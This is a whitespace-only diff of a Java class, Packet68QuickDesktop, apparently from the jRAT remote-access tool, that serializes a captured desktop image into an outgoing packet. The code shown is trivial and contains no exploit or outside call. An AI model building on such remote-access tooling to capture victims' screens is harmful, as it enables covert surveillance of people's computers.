@@ -4,11 +4,10 @@ import java.io.DataOutputStream;
 
 import pro.jrat.common.io.StringWriter;
 
-
 public class Packet68QuickDesktop extends AbstractOutgoingPacket {
-	
+
 	private byte[] image;
-	
+
 	public Packet68QuickDesktop(byte[] image) {
 		this.image = image;
 	}
@@ -16,7 +15,7 @@ public class Packet68QuickDesktop extends AbstractOutgoingPacket {
 	@Override
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
 		dos.writeInt(image.length);
-		dos.write(image);		
+		dos.write(image);
 	}
 
 	@Override
